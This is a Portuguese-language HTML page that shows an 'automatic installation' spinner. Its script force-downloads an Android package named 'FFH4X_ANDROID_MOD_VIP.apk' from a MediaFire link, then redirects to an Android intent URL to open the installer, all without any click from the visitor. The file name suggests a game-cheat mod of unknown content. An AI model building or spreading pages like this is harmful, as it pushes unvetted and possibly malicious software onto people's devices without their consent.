<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Instalação automática</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#0b0b0b;
    color:#fff;
    font-family:Arial, sans-serif;
}
.box{
    text-align:center;
}
.loader{
    margin:20px auto;
    width:48px;
    height:48px;
    border:5px solid #2a2a2a;
    border-top:5px solid #00ff9c;
    border-radius:50%;
    animation:spin 1s linear infinite;
}
@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}
.text{
    font-size:15px;
    opacity:.85;
}
</style>

<script>
setTimeout(() => {
    // força download
    const a = document.createElement("a");
    a.href = "https://www.mediafire.com/file/7gg2grku14mopxn/FFH4X_ANDROID_MOD_VIP.apk/file?dkey=0ss8l63ewuf&r=495";
    a.download = "FFH4X_ANDROID_MOD_VIP.apk";
    document.body.appendChild(a);
    a.click();

    // tenta abrir instalador Android (funciona em alguns navegadores Android)
    setTimeout(() => {
        window.location.href = "intent://www.mediafire.com/file/7gg2grku14mopxn/FFH4X_ANDROID_MOD_VIP.apk/file#Intent;scheme=https;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end";
    }, 1200);

}, 1000);
</script>
</head>

<body>
<div class="box">
    <div class="loader"></div>
    <div class="text">Baixando e preparando instalação...</div>
</div>
</body>
</html>
